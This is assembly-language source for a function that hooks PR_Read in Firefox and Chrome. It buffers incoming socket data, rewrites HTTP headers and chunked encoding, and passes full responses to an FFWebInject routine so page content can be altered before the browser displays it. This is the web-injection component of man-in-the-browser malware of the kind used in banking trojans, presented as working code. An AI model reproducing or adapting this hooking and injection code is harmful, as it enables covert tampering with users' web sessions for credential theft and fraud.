
.code

;; ==================================================================================================== ;;
;; hPR_Read is a PR_Read handler procedure of Firefox & Chrome browsers                                 ;;
;; ==================================================================================================== ;;
hPR_Read proc p1, p2, p3: dword
	local  lpData : dword
	local  myp2   : dword
	local  myp3   : dword



	mov  eax, p1	;; PRFileDesc
	mov  eax, [eax]	;; PRIOMethods
	mov  eax, [eax]	;; PRDescType

	cmp  eax, 2		;; PR_DESC_FILE       = 1
	je   @F			;; PR_DESC_SOCKET_TCP = 2
	cmp  eax, 4		;; PR_DESC_SOCKET_UDP = 3
	je   @F			;; PR_DESC_LAYERED    = 4


	GetBaseDelta eax
	invokx  _PR_Read[eax], p1, p2, p3
	add  esp, 12
	leave
	retn


;; ================================================== ;;
@@:	pushad
	GetBaseDelta ebx

	invokx  &ArrayKeyPos[ebx], lpSockHandlesArray[ebx], p1
	jmpnz eax, @giveback	;; give back flag is set


	invokx  &ArrayKeyPos[ebx], lpReadBuffersArray[ebx], p1
	jmpnz eax, @collect		;; continue collecting


	invokx  &GetInject[ebx], p1, 0
	jmpz eax, @F			;; collecting not need


	invokx  &ArrayKeyBuff[ebx], lpReadBuffersArray[ebx], p1
	jmpnz eax, @collect		;; alloc collecting buffer


@@:	popad
	GetBaseDelta eax
	invokx  _PR_Read[eax], p1, p2, p3
	add  esp, 12
pushad
	GetBaseDelta ebx
	invokx  &FixHeaders[ebx], p2, eax
popad
	leave
	retn


;; ================================================== ;;
@collect:
	mov  esi, [eax+4]	;; ptr to data len
	mov  lpData, esi	;; ptr to data with its len in 1st dword
	lea  eax, [esi+4]	;; ptr to data start
	add  eax, [esi]		;; ptr to data end
	mov  myp2, eax		;; ptr to end of already grabbed data


@readmore:
	mov  eax, BUFFERLEN-RESERVE
	sub  eax, [esi]
	jmpz eax, @webinject	;; if no more space in buffer to collect data
	mov  myp3, eax

popad
	GetBaseDelta eax
	invokx  _PR_Read[eax], p1, myp2, myp3
	add  esp, 12
pushad

	mov  myp3, eax		;; save answer code
	jmple eax, @end


	add  myp2, eax		;; ptr to end of already grabbed data
	mov  esi, lpData	;; ptr to data with its len in 1st dword
	add  [esi], eax		;; new data len


	GetBaseDelta ebx
	invokx  &CheckEOF[ebx], lpData
	jmpz eax, @readmore	;; not EOF



@webinject:
	invokx  &ArrayKeyPos[ebx], lpSockHandlesArray[ebx], 0
	mov  ecx, p1
	mov  [eax], ecx		;; set give back flag


;DEBUG "RAW", lpData, lpData
	mov  esi, lpData
	lodsd				;; data len
	invokx  &FixHeaders[ebx], esi, eax
;DEBUG "HEADERS", lpData, lpData
	invokx  &FixChunk[ebx], lpData
;DEBUG "FIXED", lpData, lpData
	invokx  &FFWebInject[ebx], p1, lpData
;DEBUG "INJCTED", lpData, lpData
	invokx  &FixLen[ebx], lpData
;DEBUG "FINALLY", lpData, lpData



@giveback:
	invokx  &ArrayKeyPos[ebx], lpReadBuffersArray[ebx], p1
	mov  esi, [eax+4]	;; ptr to data len
	lea  edi, [esi+4]	;; ptr to data start


	;; return data to caller
	mov  ecx, [esi]		;; data len
	cmp  ecx, p3
	jbe  @F
	mov  ecx, p3
@@:	invokx  &strcpyn[ebx], p2, edi, ecx
	mov  myp3, ecx


	sub  [esi], ecx		;; new data len
	mov  eax, [esi]		;; new data len
	jmpz eax, @endgive	;; no more data to give back


	;; shift data
	add  ecx, edi		;; ptr to new data start
	invokx  &strcpyn[ebx], edi, ecx, eax
	jmp  @end


@endgive:
	invokx  &ArrayKeyDel[ebx], lpSockHandlesArray[ebx], p1	;; reset give back flag
	invokx  &ArrayKeyDel[ebx], lpReadBuffersArray[ebx], p1	;; delete collect buffer


@end:
popad
	mov  eax, myp3

	leave
	retn
hPR_Read endp

